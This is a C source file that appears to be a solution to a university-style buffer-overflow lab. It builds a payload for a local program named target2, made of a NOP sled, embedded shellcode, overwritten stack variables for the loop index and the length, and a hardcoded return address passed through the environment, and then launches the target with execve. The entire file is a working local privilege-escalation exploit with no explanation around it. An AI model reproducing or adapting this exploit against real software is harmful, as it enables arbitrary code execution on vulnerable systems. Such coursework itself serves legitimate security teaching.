#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define shellcode_margin 128

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[3];

	char sploit_str[284];

	// Targets
	char buf_addr[] = "\x80\xfd\x21\x20";
	// Variable "i" is located 0x108 away from start of "buf"
	// Variable "len" is located 0x10c away from start of "buf"

	// Fill with NOP until 0x108
	int i = 0;
	for (; i < 0x108; ++i)
	{
		sploit_str[i] = NOP;
	}

	// Append the shellcode
	for (i = shellcode_margin; i < (shellcode_margin + strlen(shellcode)); ++i)
	{
		sploit_str[i] = shellcode[i - shellcode_margin];
	}

	// Skip "i" located at 0x108, replace value with 0x0b
	sploit_str[0x108] = 0x0b;

	// Since until 0x10c contains NOP, shellcode, and change to i, 0x10c + 8 bytes = 0x11c
	// Change "len" to 0x11c - 1 = 0x11b
	sploit_str[0x10c] = 0x1b;
	sploit_str[0x10d] = 0x01;

	// Append EOF character at 0x10e
	sploit_str[0x10e] = 0;

	for (i = 0; i < 284;){
		//printf("%x\n", *(unsigned long *) &sploit_str[i]);
		i = i + 4;
	}

	args[0] = TARGET;
	args[1] = sploit_str;
	args[2] = NULL;

	env[0] = &sploit_str[0x10e];
	// Hardcode little Endian target address with 8-byte proxy at head
	env[1] = "abcdefgh\x80\xfd\x21\x20";
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
